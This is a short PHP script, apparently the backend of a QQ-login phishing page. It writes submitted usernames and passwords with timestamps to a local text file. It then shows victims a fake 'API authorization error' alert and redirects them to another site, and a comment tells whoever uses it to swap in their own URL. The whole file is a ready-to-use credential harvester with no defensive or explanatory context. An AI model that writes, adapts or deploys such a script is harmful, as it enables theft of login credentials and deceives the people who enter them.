<?php
error_reporting(E_ALL ^ E_NOTICE);//用来关闭错误报告
$name = $_POST[u]; 
$pwd = $_POST[p];
$sj1="记录时间为：";
$yu="用户名为：";
$mi="密码为：";
$sj=date("Y-m-d H:i:s");
$lu = fopen("myqq.txt","a+");
fwrite($lu,$yu.$name."\r\n".$mi.$pwd."\r\n".$sj1.$sj."\r\n");
fclose($lu);
?>
<?php
echo "<script language=\"JavaScript\">\r\n";
echo " alert(\"API授权错误！请用其他方式登录！\");\r\n";
echo " location.replace(\"https://bbskali.cn/qq\");\r\n"; // 自己修改网址
echo "</script>";
exit;
?>
